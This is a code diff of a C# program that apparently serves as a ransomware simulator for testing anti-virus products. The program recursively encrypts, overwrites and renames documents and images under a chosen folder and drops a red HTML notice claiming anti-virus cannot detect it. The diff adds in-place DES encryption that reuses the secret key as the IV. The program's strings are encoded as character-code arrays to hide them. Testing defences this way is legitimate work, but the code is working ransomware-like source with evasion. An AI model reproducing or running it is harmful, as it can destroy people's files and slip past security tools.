@@ -14,7 +14,7 @@ using System.Globalization;
 using System.Text.RegularExpressions;
 using System.Windows.Forms;
 
-namespace EncryptDelTestv4
+namespace EncryptDelTestv4_1
 {
     public static class GlobalVar
     {
@@ -22,9 +22,9 @@ namespace EncryptDelTestv4
         public static string myargs = "";
         public static string choose = "";
         public static int encryptedcount = 0;
-        public static string strEncrypt = (Convert.ToChar(101)).ToString() + (Convert.ToChar(110)).ToString() + (Convert.ToChar(99)).ToString() + (Convert.ToChar(114)).ToString() + (Convert.ToChar(121)).ToString()  + (Convert.ToChar(112)).ToString() + (Convert.ToChar(116)).ToString();
+        public static string strEncrypt = (Convert.ToChar(101)).ToString() + (Convert.ToChar(110)).ToString() + (Convert.ToChar(99)).ToString() + (Convert.ToChar(114)).ToString() + (Convert.ToChar(121)).ToString() + (Convert.ToChar(112)).ToString() + (Convert.ToChar(116)).ToString();
         public static string strDecrypt = (Convert.ToChar(100)).ToString() + (Convert.ToChar(101)).ToString() + (Convert.ToChar(99)).ToString() + (Convert.ToChar(114)).ToString() + (Convert.ToChar(121)).ToString() + (Convert.ToChar(112)).ToString() + (Convert.ToChar(116)).ToString();
-        public static string strCrypted = (Convert.ToChar(99)).ToString() + (Convert.ToChar(114)).ToString() + (Convert.ToChar(121)).ToString() + (Convert.ToChar(112)).ToString() + (Convert.ToChar(116)).ToString() + (Convert.ToChar(101)).ToString() + (Convert.ToChar(100)).ToString();
+        public static string strCrypted = (Convert.ToChar(103)).ToString() + (Convert.ToChar(103)).ToString();
     }
 
     class Program
@@ -32,7 +32,7 @@ namespace EncryptDelTestv4
         [STAThread]
         static void Main(string[] args)
         {
-            int[] CharNum = { 91, 69, 110, 99, 114, 121, 112, 116, 32, 68, 101, 108, 101, 116, 101, 32, 84, 101, 115, 116, 32, 118, 52, 93 };
+            int[] CharNum = { 91, 69, 110, 99, 114, 121, 112, 116, 32, 68, 101, 108, 101, 116, 101, 32, 84, 101, 115, 116, 32, 118, 52, 46, 49, 93 };
             Console.WriteLine(NumtoString(CharNum));
             CharNum = new int[] { 83, 105, 109, 117, 108, 97, 116, 101, 32, 114, 97, 110, 115, 111, 109, 119, 97, 114, 101, 32, 101, 110, 99, 114, 121, 112, 116, 105, 111, 110, 32, 111, 112, 101, 114, 97, 116, 105, 111, 110 };
             Console.WriteLine(NumtoString(CharNum));
@@ -40,7 +40,7 @@ namespace EncryptDelTestv4
             Console.WriteLine(NumtoString(CharNum));
             CharNum = new int[] { 80, 108, 101, 97, 115, 101, 32, 100, 111, 119, 110, 108, 111, 97, 100, 32, 116, 104, 101, 32, 111, 114, 105, 103, 105, 110, 97, 108, 32, 97, 110, 100, 32, 108, 97, 116, 101, 115, 116, 32, 118, 101, 114, 115, 105, 111, 110, 32, 102, 114, 111, 109, 32, 104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 101, 100, 100, 105, 101, 99, 104, 117, 47, 69, 110, 99, 114, 121, 112, 116, 45, 68, 101, 108, 101, 116, 101, 45, 84, 101, 115, 116 };
             Console.WriteLine(NumtoString(CharNum));
-            CharNum = new int[] { 86, 101, 114, 115, 105, 111, 110, 32, 118, 52, 46, 48, 46, 48, 32, 40, 56, 47, 79, 99, 116, 47, 50, 48, 50, 49, 41 };
+            CharNum = new int[] { 86, 101, 114, 115, 105, 111, 110, 32, 118, 52, 46, 49, 46, 48, 32, 40, 49, 49, 47, 83, 101, 112, 47, 50, 48, 50, 50, 41 };
             Console.WriteLine(NumtoString(CharNum));
             Console.WriteLine("");
             CharNum = new int[] { 84, 104, 105, 115, 32, 116, 111, 111, 108, 32, 101, 110, 99, 114, 121, 112, 116, 115, 32, 45, 32, 111, 118, 101, 114, 119, 114, 105, 116, 101, 115, 32, 45, 32, 114, 101, 110, 97, 109, 101, 115, 32, 116, 104, 101, 32, 102, 105, 108, 101, 32, 117, 110, 100, 101, 114, 32, 115, 101, 108, 101, 99, 116, 101, 100, 32, 102, 111, 108, 100, 101, 114, 32, 97, 110, 100, 32, 105, 116, 39, 115, 32, 115, 117, 98, 102, 111, 108, 100, 101, 114, 40, 115, 41 };
@@ -112,7 +112,7 @@ namespace EncryptDelTestv4
 
                         CharNum = new int[] { 60, 98, 111, 100, 121, 32, 98, 103, 99, 111, 108, 111, 114, 61, 114, 101, 100, 62 };
                         file.WriteLine(NumtoString(CharNum));
-                        CharNum = new int[] { 60, 102, 111, 110, 116, 32, 115, 105, 122, 101, 61, 43, 49, 48, 32, 99, 111, 108, 111, 114, 61, 119, 104, 105, 116, 101, 62, 60, 98, 62, 91, 69, 110, 99, 114, 121, 112, 116, 68, 101, 108, 84, 101, 115, 116, 118, 52, 93, 60, 47, 98, 62, 60, 47, 102, 111, 110, 116, 62, 60, 98, 114, 62, 60, 98, 114, 62, 60, 98, 114, 62, 60, 98, 114, 62 };
+                        CharNum = new int[] { 60, 102, 111, 110, 116, 32, 115, 105, 122, 101, 61, 43, 49, 48, 32, 99, 111, 108, 111, 114, 61, 119, 104, 105, 116, 101, 62, 60, 98, 62, 91, 69, 110, 99, 114, 121, 112, 116, 68, 101, 108, 84, 101, 115, 116, 118, 52, 46, 49, 93, 60, 47, 98, 62, 60, 47, 102, 111, 110, 116, 62, 60, 98, 114, 62, 60, 98, 114, 62, 60, 98, 114, 62, 60, 98, 114, 62 };
                         file.WriteLine(NumtoString(CharNum));
                         CharNum = new int[] { 60, 102, 111, 110, 116, 32, 115, 105, 122, 101, 61, 43, 49, 48, 32, 99, 111, 108, 111, 114, 61, 119, 104, 105, 116, 101, 62, 89, 111, 117, 114, 32, 97, 110, 116, 105, 45, 118, 105, 114, 117, 115, 32, 115, 111, 102, 116, 119, 97, 114, 101, 32, 60, 117, 62, 67, 65, 78, 78, 79, 84, 60, 47, 117, 62, 32, 100, 101, 116, 101, 99, 116, 32, 116, 104, 105, 115, 32, 116, 101, 115, 116, 60, 47, 102, 111, 110, 116, 62, 60, 98, 114, 62, 60, 98, 114, 62 };
                         file.WriteLine(NumtoString(CharNum));
@@ -166,7 +166,7 @@ namespace EncryptDelTestv4
             return result;
         }
 
-        static void EncryptFile(string sInputFilename,
+        static void EncryptFile_AES(string sInputFilename,
            string sOutputFilename,
            string sKey)
         {
@@ -174,8 +174,7 @@ namespace EncryptDelTestv4
                 FileMode.Open,
                 FileAccess.Read);
 
-            byte[] salt = { 0x0, 0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6,
-        0xF1, 0xF0, 0xEE, 0x21, 0x22, 0x45 };
+            byte[] salt = { 0x0, 0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0xF1, 0xF0, 0xEE, 0x21, 0x22, 0x45 };
             byte[] passwords = Encoding.UTF8.GetBytes(sKey);
             RijndaelManaged AES = new RijndaelManaged();
             AES.KeySize = 256;
@@ -204,7 +203,35 @@ namespace EncryptDelTestv4
             GlobalVar.encryptedcount = GlobalVar.encryptedcount + 1;
         }
 
-        static void DecryptFile(string sInputFilename,
+        static void EncryptFile_Fast(String inName, String outName, byte[] desKey, byte[] desIV)
+        {
+            FileStream fs = new FileStream(inName, FileMode.Open, FileAccess.Read);
+            SymmetricAlgorithm aes = DESCryptoServiceProvider.Create();
+            aes.Key = desKey;
+            aes.IV = desIV;
+            CryptoStream stream1 = new CryptoStream(fs, aes.CreateEncryptor(), CryptoStreamMode.Read);
+            CryptoStream stream2 = new CryptoStream(stream1, new ToBase64Transform(), CryptoStreamMode.Read);
+
+            byte[] buffer = new byte[16 * 1024];
+            using (MemoryStream ms = new MemoryStream())
+            {
+                int read;
+                while ((read = stream2.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    ms.Write(buffer, 0, read);
+                }
+                fs.Close();
+                using (BinaryWriter binWriter = new BinaryWriter(File.Open(inName, FileMode.Create)))
+                {
+                    binWriter.Write(ms.ToArray());
+                }
+            }
+            File.Move(inName, outName);
+
+            GlobalVar.encryptedcount = GlobalVar.encryptedcount + 1;
+        }
+
+        static void DecryptFile_AES(string sInputFilename,
            string sOutputFilename,
            string sKey)
         {
@@ -235,13 +262,34 @@ namespace EncryptDelTestv4
                 }
             }
         }
-        
+
+        static void DecryptFile_Fast(String inName, String outName, byte[] desKey, byte[] desIV)
+        {
+            FileStream fs = new FileStream(inName, FileMode.Open, FileAccess.Read);
+            SymmetricAlgorithm aes = DESCryptoServiceProvider.Create();
+            aes.Key = desKey;
+            aes.IV = desIV;
+            CryptoStream stream1 = new CryptoStream(fs, new FromBase64Transform(FromBase64TransformMode.IgnoreWhiteSpaces), CryptoStreamMode.Read);
+            CryptoStream stream2 = new CryptoStream(stream1, aes.CreateDecryptor(), CryptoStreamMode.Read);
+            FileStream fsout = new FileStream(outName, FileMode.OpenOrCreate);
+            byte[] buffer = new byte[1024];
+            int bytesRead;
+            UTF8Encoding utf8 = new UTF8Encoding();
+            do
+            {
+                bytesRead = stream2.Read(buffer, 0, 1024);
+                fsout.Write(buffer, 0, bytesRead);
+            } while (bytesRead > 0);
+            fsout.Flush();
+            fsout.Close();
+        }
+
         public static void ProcessDirectory(string targetDirectory)
         {
             String supportedfileextensions = "";
             if (GlobalVar.choose.StartsWith(GlobalVar.strEncrypt))
             {
-                int[] CharNum = { 42, 46, 100, 111, 99, 44, 42, 46, 100, 111, 99, 120, 44, 42, 46, 120, 108, 115, 44, 42, 46, 120, 108, 115, 120, 44, 42, 46, 116, 120, 116, 44, 42, 46, 114, 116, 102, 44, 42, 46, 112, 100, 102, 44, 42, 46, 106, 112, 103, 44, 42, 46, 106, 112, 101, 103, 44, 42, 46, 103, 105, 102, 44, 42, 46, 98, 109, 112, 44, 42, 46, 112, 110, 103};
+                int[] CharNum = { 42, 46, 100, 111, 99, 44, 42, 46, 100, 111, 99, 120, 44, 42, 46, 120, 108, 115, 44, 42, 46, 120, 108, 115, 120, 44, 42, 46, 116, 120, 116, 44, 42, 46, 114, 116, 102, 44, 42, 46, 112, 100, 102, 44, 42, 46, 106, 112, 103, 44, 42, 46, 106, 112, 101, 103, 44, 42, 46, 103, 105, 102, 44, 42, 46, 98, 109, 112, 44, 42, 46, 112, 110, 103 };
                 supportedfileextensions = NumtoString(CharNum);
             }
             else
@@ -266,6 +314,7 @@ namespace EncryptDelTestv4
         public static void ProcessFile(string path)
         {
             Console.WriteLine("");
+
             if (GlobalVar.choose.StartsWith(GlobalVar.strEncrypt))
             {
                 string newfileext;
@@ -273,7 +322,7 @@ namespace EncryptDelTestv4
                 int[] CharNum = { 69, 110, 99, 114, 121, 112, 116, 32, 97, 110, 100, 32, 111, 118, 101, 114, 119, 114, 105, 116, 101, 32, 116, 111 };
                 Console.WriteLine(NumtoString(CharNum) + " '{0}'", path + newfileext);
 
-                EncryptFile(@path, @path + newfileext, GlobalVar.sSecretKey);
+                EncryptFile_Fast(@path, @path + newfileext, ASCIIEncoding.ASCII.GetBytes(GlobalVar.sSecretKey), ASCIIEncoding.ASCII.GetBytes(GlobalVar.sSecretKey));
 
             }
             else if (GlobalVar.choose.StartsWith(GlobalVar.strDecrypt))
@@ -283,7 +332,7 @@ namespace EncryptDelTestv4
                 int[] CharNum = { 68, 101, 99, 114, 121, 112, 116, 32, 116, 111 };
                 Console.WriteLine(NumtoString(CharNum) + " '{0}'", newfilename);
 
-                DecryptFile(@path, @newfilename, GlobalVar.sSecretKey);
+                DecryptFile_Fast(@path, @newfilename, ASCIIEncoding.ASCII.GetBytes(GlobalVar.sSecretKey), ASCIIEncoding.ASCII.GetBytes(GlobalVar.sSecretKey));
             }
         }
     }
